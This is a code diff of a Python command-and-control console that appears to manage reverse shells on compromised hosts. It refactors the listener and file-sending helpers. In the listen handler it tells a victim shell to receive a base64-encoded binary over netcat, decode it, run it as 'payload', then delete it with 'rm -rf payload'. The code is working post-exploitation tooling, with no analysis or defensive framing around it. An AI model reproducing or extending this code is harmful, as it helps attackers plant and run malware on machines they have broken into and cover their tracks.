@@ -1,58 +1,18 @@
 #!/usr/bin/python3
 
-from nethelper import ServerSocket, pretty, netshell_loop
+from modules.utils import pretty, listen, send_file, chk_payload
+from modules.sysinfo import SystemInfoGatherer
+from modules.nethelper import netshell_loop
 from threading import Thread
-from base64 import b64encode
 import logging
 import socket
 import time
 import sys
 import cmd
+import os
 
 
 logging.basicConfig(level=logging.INFO)
-
-def listen(line, py_state):
-    if not line:
-        host, port = ("localhost", 4242)
-    else:
-        host, port = line.strip().split(" ")
-
-    sock = ServerSocket()
-
-    try:
-        sock.server_socket.bind((host, int(port)))
-    except socket.error:
-        logging.error("Address already in use")
-        return
-    
-    logging.info(f"Started listener on {host, port}")
-
-    try:
-        sock.listen()
-        if not sock.is_shell(py_state):
-            logging.error("No shell found")
-            return
-    except KeyboardInterrupt:
-        sock.server_socket.close()
-        print("")
-        return
-    except BrokenPipeError:
-        sock.server_socket.close()
-        logging.error("BrokenPipeError")
-        return
-
-    return sock
-
-def send_file(file_name, ip, port):
-    with open(file_name, 'rb') as f:
-        binary_data = f.read()
-
-    base64_data = b64encode(binary_data)
-    s = socket.socket()
-    s.connect((ip, port))
-    s.sendall(base64_data)
-    s.close()
 
 class NetShell(cmd.Cmd):
     def __init__(self, server):
@@ -152,6 +112,11 @@ class LocalShell(cmd.Cmd):
         if len(sys.argv) > 1 and sys.argv[1] == "-l":
             self.do_listen(None)
         
+        if not os.path.isfile('payload'):
+            logging.warning('Warning: Binary file "payload" is not present.')
+            chk_payload()
+
+        
     def emptyline(self):
         """Called when an empty line is entered in response to the prompt.
 
@@ -172,18 +137,17 @@ class LocalShell(cmd.Cmd):
 
     def do_listen(self, line):
         sock = listen(line, 0)
+        sock.sysinfo = SystemInfoGatherer()
+        sock.sysinfo.binaryGatherer(sock)
 
         if not sock:
             return
         
-        is_py = sock.send_command("which python").decode().strip()
-        is_py3 = sock.send_command("which python3").decode().strip()
-        
-        if "_3X1T_5TATUS=0" in is_py3: #BUG: ls command doesnt work when using pyclient
+        if sock.sysinfo.is_python3:
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
             sock.client_socket.send(b"chmod +x payload\n")
-            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && /home/pi/opt/testfolder/payload'\n") # TODO: then base64 out of it
+            sock.client_socket.send(b"setsid sh -c 'nc -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n")
             sock.server_socket.close()
             sock.client_socket.close()
             send_file("payload", "localhost", 1234)
@@ -191,7 +155,7 @@ class LocalShell(cmd.Cmd):
             sock = listen(line, 1)
             sock.client_socket.send(b"rm -rf payload\n")
         else:
-            logging.error("Python was not found. Using shell as client.")
+            logging.error("python was not found. Using shell as client.")
 
         self.currentSession = NetShell(sock)
 
